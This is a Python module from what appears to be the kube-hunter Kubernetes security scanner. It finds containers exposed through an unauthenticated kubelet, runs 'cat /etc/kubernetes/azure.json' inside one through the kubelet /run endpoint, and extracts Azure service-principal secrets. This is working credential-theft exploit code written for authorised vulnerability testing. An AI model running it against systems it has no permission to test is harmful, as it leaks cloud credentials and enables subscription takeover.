import json
import logging

import requests

from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
from kube_hunter.core.events import handler
from kube_hunter.core.events.types import Event, Vulnerability
from kube_hunter.core.types import Hunter, ActiveHunter, IdentityTheft, Azure


class AzureSpnExposure(Vulnerability, Event):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""
    def __init__(self, container):
        Vulnerability.__init__(self, Azure, "Azure SPN Exposure", category=IdentityTheft, vid="KHV004")
        self.container = container

@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud=="Azure")
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """
    def __init__(self, event):
        self.event = event
        self.base_url = "https://{}:{}".format(self.event.host, self.event.port)

    # getting a container that has access to the azure.json file
    def get_key_container(self):
        logging.debug("Passive Hunter is attempting to find container with access to azure.json file")
        raw_pods = requests.get(self.base_url + "/pods", verify=False).text
        if "items" in raw_pods:
            pods_data = json.loads(raw_pods)["items"]
            for pod_data in pods_data:
                for container in pod_data["spec"]["containers"]:
                    for mount in container["volumeMounts"]:
                        path = mount["mountPath"]
                        if '/etc/kubernetes/azure.json'.startswith(path):
                            return {
                                "name": container["name"],
                                "pod": pod_data["metadata"]["name"],
                                "namespace": pod_data["metadata"]["namespace"]
                            }

    def execute(self):
        container = self.get_key_container()
        if container:
            self.publish_event(AzureSpnExposure(container=container))

""" Active Hunting """
@handler.subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """
    def __init__(self, event):
        self.event = event
        self.base_url = "https://{}:{}".format(self.event.host, self.event.port)

    def run(self, command, container):
        run_url = "{base}/run/{pod_namespace}/{pod_id}/{container_name}".format(
            base=self.base_url,
            pod_namespace=container["namespace"],
            pod_id=container["pod"],
            container_name=container["name"]
        )
        return requests.post(run_url, verify=False, params={'cmd': command}).text

    def execute(self):
        raw_output = self.run("cat /etc/kubernetes/azure.json", container=self.event.container)
        if "subscriptionId" in raw_output:
            subscription = json.loads(raw_output)
            self.event.subscriptionId = subscription["subscriptionId"]
            self.event.aadClientId = subscription["aadClientId"]
            self.event.aadClientSecret = subscription["aadClientSecret"]
            self.event.tenantId = subscription["tenantId"]
            self.event.evidence = "subscription: {}".format(self.event.subscriptionId)
